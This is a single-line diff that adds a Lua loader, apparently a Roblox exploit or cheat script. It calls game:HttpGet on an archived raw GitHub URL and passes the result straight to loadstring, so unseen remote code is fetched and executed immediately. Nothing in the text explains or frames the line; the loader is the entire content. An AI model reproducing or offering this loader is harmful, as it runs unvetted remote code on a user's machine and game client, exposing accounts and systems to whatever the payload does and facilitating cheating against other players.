@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://web.archive.org/web/20240325130258/https://raw.githubusercontent.com/darkxwin/darkxsourcethinkyoutousedarkx/main/darkx'))()
